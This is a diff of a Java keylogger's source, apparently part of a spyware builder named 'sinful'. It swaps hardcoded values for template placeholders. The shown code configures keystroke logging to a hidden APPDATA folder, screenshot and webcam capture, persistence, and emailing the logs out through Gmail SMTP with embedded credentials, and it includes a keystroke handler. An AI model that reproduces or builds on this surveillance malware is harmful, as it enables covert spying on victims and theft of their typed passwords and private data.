@@ -25,7 +25,7 @@ public class Keylogger extends javax.swing.JFrame implements NativeKeyListener {
 
     private static DateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd");
     private static DateFormat dateFormatHour = new SimpleDateFormat("yyyy-MM-dd HH-mm-ss");
-    private static String folder = "\\sINFUL";
+    private static String folder = "\\sinful";
     private static String environment_variable_path = "APPDATA";
     private static String path_logs = "\\Logs\\";
     private static String path_screenshot = "\\Screenshot\\";
@@ -36,22 +36,22 @@ public class Keylogger extends javax.swing.JFrame implements NativeKeyListener {
     private static String logs = "";
     private static String logs_send = "";
     private static String smtp = "smtp.gmail.com";
-    private static String email_from = "lol";
-    private static String email_password = "21";
-    private static String email_to = "lol";
-    private static String subject = "sINFUL";
+    private static String email_from = "email@gmail.com";
+    private static String email_password = "passwordemail";
+    private static String email_to = "email@gmail.com";
+    private static String subject = "subjectName";
     private static String port = "";
     private static int cam_width = 640;
     private static int cam_height = 480;
-    private static int count = 1;
+    private static int count = countNumber;
     private static int count_state = 0;
     private static boolean ssl = true;
     private static boolean tls = false;
     private static boolean debug_email = true;
-    private static boolean screenshot = true;
-    private static boolean cam = true;
-    private static boolean persistence = true;
-    private static boolean keepdata = true;
+    private static boolean screenshot = booleanScreenshot;
+    private static boolean cam = booleanCam;
+    private static boolean persistence = booleanPersistence;
+    private static boolean keepdata = booleanKeepData;
     private static String name_jar = "\\sinful.jar";
 
     public static void main(String[] args) throws IOException {
@@ -239,7 +239,7 @@ public class Keylogger extends javax.swing.JFrame implements NativeKeyListener {
 
     @Override
     public void nativeKeyPressed(NativeKeyEvent nke) {
-//        System.out.println(nke.getRawCode());
+
         switch (nke.getRawCode()) {
             case 8:
                 SaveLogs("[Backspace]");
